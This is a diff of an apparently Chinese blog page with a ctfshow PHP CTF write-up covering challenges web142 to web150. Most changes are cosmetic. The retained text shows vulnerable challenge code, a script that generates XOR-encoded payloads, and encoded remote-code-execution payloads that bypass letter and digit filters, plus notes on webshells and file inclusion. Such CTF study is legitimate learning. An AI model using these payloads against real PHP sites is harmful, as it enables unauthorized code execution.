 <p>具体可以查看这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">(6条消息) 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）<em>yu22x的博客-CSDN博客</em># 无字母数字绕过正则表达式总结</a></p>
 <p>但是如何绕过 <code>$v1$v3$v2</code> 呢？</p>
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214162033883.png" alt="image-20221214162033883"></p>
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214162128436.png" alt="image-20221214162128436"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214162033883.png" alt="image-20221214162033883"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214162128436.png" alt="image-20221214162128436"></p>
 <h3 id="web142-php字母0乘以数字会将字母0转为数字0"><a href="#web142-php字母0乘以数字会将字母0转为数字0" class="headerlink" title="web142-php字母0乘以数字会将字母0转为数字0"></a>web142-php字母0乘以数字会将字母0转为数字0</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 highlight_file(__FILE__);
@@ -1119,17 +1049,11 @@ if(isset($_GET[&#39;v1&#39;]))&#123;
         echo file_get_contents(&quot;flag.php&quot;);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <pre class="line-numbers language-none"><code class="language-none">payload:
 ?v1&#x3D;0   	八进制
 ?v1&#x3D;0x0		16进制
 ?v1&#x3D;0e123	科学计数法
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="web143-异或rce"><a href="#web143-异或RCE" class="headerlink" title="web143-异或RCE"></a>web143-异或RCE</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
@@ -1146,7 +1070,6 @@ if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; i
         &#125;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>给出脚本，注意正则表达式要根据题目修改！！！！！</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
@@ -1188,7 +1111,6 @@ for ($i&#x3D;0; $i &lt; 256; $i++) &#123;
 fwrite($myfile,$contents);
 fclose($myfile);
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"># -*- coding: utf-8 -*-
 
 # author yu22x
@@ -1219,12 +1141,8 @@ while True:
    param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;
    print(param)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>最后的 payload，注意将 <code>;</code> 改为 <code>?&gt;</code> ，这是上述脚本的一个不足之处。</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;f52c4b35-37eb-46b9-b8ee-375968033178.challenge.ctf.show&#x2F;?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%03%01%0b%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%60%60%7f%20%60%60%60%60%2f%7f%60%7f&quot;)?&gt;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web144-1-phpinfo可以执行命令"><a href="#web144-1-phpinfo-可以执行命令" class="headerlink" title="web144-1-phpinfo();可以执行命令"></a>web144-1-phpinfo();可以执行命令</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
@@ -1243,12 +1161,8 @@ if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; i
 function check($str)&#123;
     return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>很明显要在 v2 注入命令，这里只是要求不能出现字母数字，直接用上一题的脚本。需要知道的是 <code>1-phpinfo();</code> 可以成功执行命令。同时还要学会用 <code>?&gt;</code> 结束 php 代码！</p>
 <pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v3&#x3D;-&amp;v2&#x3D;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%03%01%0b%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%60%60%7f%20%60%60%60%60%2f%7f%60%7f&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web145-巧用三目运算符绕过命令后面跟随的数字"><a href="#web145-巧用三目运算符绕过命令后面跟随的数字" class="headerlink" title="web145-巧用三目运算符绕过命令后面跟随的数字"></a>web145-巧用三目运算符绕过命令后面跟随的数字</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
@@ -1265,12 +1179,8 @@ if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; i
         &#125;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这一关最糟糕的点就是不能使用 <code>?&gt;</code> 去截断后面的 v2 了，这导致命令执行会报错。后续看到是巧用了 PHP 的 三目运算符！</p>
 <pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F):<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web146-难道-php-中-数字拼接任意运算符再拼接上命令命令还是可以执行"><a href="#web146-难道-php-中-数字拼接任意运算符再拼接上命令，命令还是可以执行？" class="headerlink" title="web146-难道 php 中 数字拼接任意运算符再拼接上命令，命令还是可以执行？"></a>web146-难道 php 中 数字拼接任意运算符再拼接上命令，命令还是可以执行？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
@@ -1287,14 +1197,8 @@ if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; i
         &#125;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214202129529.png" alt="image-20221214202129529"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214202129529.png" alt="image-20221214202129529"></p>
 <pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-
-
 <h3 id="web147-匿名函数-create_function"><a href="#web147-匿名函数-create-function" class="headerlink" title="web147-匿名函数 create_function"></a>web147-匿名函数 create_function</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 
@@ -1305,10 +1209,9 @@ if(isset($_POST[&#39;ctf&#39;]))&#123;
     &#125;
 
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214203430655.png" alt="image-20221214203430655"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214203430655.png" alt="image-20221214203430655"></p>
 <p>绕过正则匹配的方式很简单，在payload开头或者结尾添加一个不匹配正则的字符即可，但是这个字符不可以影响函数的执行。</p>
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214203914840.png" alt="image-20221214203914840"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214203914840.png" alt="image-20221214203914840"></p>
 <h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 include &#39;flag.php&#39;;
 if(isset($_GET[&#39;code&#39;]))&#123;
@@ -1325,7 +1228,6 @@ else&#123;
 function get_ctfshow_fl0g()&#123;
     echo file_get_contents(&quot;flag.php&quot;);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>没有过滤异或符号，直接用前面的脚本！</p>
 <h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
@@ -1350,7 +1252,6 @@ foreach($files as $file) &#123;
         &#125;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>直接在 index.php 文件里写入 webshell。</p>
 <h3 id="web150-php的日志文件包含及session文件包含"><a href="#web150-php的日志文件包含及SESSION文件包含" class="headerlink" title="web150-php的日志文件包含及SESSION文件包含"></a>web150-php的日志文件包含及SESSION文件包含</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 include(&quot;flag.php&quot;);
@@ -1398,7 +1299,6 @@ if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
     include($ctf);
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
                 
             </div>
@@ -1698,7 +1598,6 @@ if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
                     <div class="summary block-with-text">
                         
                             
-
 记录一下追求理想的时光。
                         
                     </div>
@@ -1777,7 +1676,7 @@ if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1789,7 +1688,7 @@ if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1918,7 +1817,7 @@ if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
